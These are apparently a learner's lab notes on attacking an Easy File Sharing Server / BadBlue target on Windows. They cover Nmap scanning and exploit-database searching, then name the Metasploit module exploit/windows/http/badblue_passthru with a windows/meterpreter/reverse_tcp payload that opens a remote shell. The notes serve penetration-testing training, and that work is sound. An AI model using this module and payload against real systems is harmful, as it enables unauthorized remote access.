# Windows: Easy File Sharing Server

In this lab we will perform an vulnerability assessment using Nmap.

**Note**: Sometimes, just performing a google search for CVEs with the service name and version of an application running in the target could be enough to find vulnerabilities.

**Note**: Sometimes CVEs and NVDs have really old information that won't probably be useful for you at the moment. In those cases, go to the exploit database, there are plenty os scripts and information that might prove useful.

**Note**: In this lab we are working with msfconsole as we discovered an exploit that can be used there in the exploit db. Use the command `search <name>` in order to check for your desired exploit. In this case the exploit is `exploit/windows/http/badblue_passthru`.

**Note**: In metasploit payload options are not visible until they are set. In this case for `exploit/windows/http/badblue_passthru`, we set up the payload like this: `set payload windows/meterpreter/reverse_tcp`. Don't forget to check your options again to see what is left. By the way, LHOST can be set by setting the interface name.

**Note**: In this case we had an available metasploit module to perform the exploit. However, if you know python, ruby or perl, you can easily set it up yourself.

**Note**: When performing the pentest, there are many things to consider looking at this badblue example. It might be internal, it might be firewalled, but it is using http so anyone listening can pull out those packets. There are possible remediations that can be implemented. So try to think around that when you prepare your report.
